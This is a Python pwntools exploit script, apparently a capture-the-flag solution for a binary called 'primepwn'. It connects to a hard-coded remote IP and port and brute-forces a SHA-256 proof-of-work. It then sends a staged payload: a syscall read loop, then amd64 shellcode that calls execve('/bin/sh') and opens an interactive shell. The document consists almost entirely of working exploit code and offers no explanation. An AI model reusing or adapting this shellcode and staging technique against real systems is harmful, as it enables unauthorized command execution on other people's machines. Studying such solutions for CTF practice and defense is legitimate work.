#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from pwnlib.util.iters import bruteforce
from parse import *
import string
from hashlib import sha256

context.log_level="debug"
pwn_file="./primepwn"


if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("47.89.18.224",10008)
    def brute_force(prefix,s):
        return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4)
    data=conn.recvline(keepends=False)
    prefix,s=parse("sha256(xxxx+{}) == {}",data)
    conn.sendline(brute_force(prefix,s))
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def check(s):
    for i in range(4,len(s),4):
        last=u32(s[i-4:i])
        now=u32(s[i:i+4])
        if last > now:
            return False
    return True

code="""
start:
    syscall
    dec edx
    mov esi,ecx
    jmp start
"""
payload=asm(code,arch="amd64")
conn.sendline(str(u64(payload)))
log.debug("sleep 20s")
sleep(20)
code="""
    mov rsp,rcx
    add rsp,0x100
    mov rax,0x3b
    xor rsi,rsi
    xor rdx,rdx
    call get_shell
    .ascii "/bin/sh"
    .byte 0
get_shell:
    pop rdi
    syscall
"""
conn.send(asm(code,arch="amd64"))
conn.interactive()
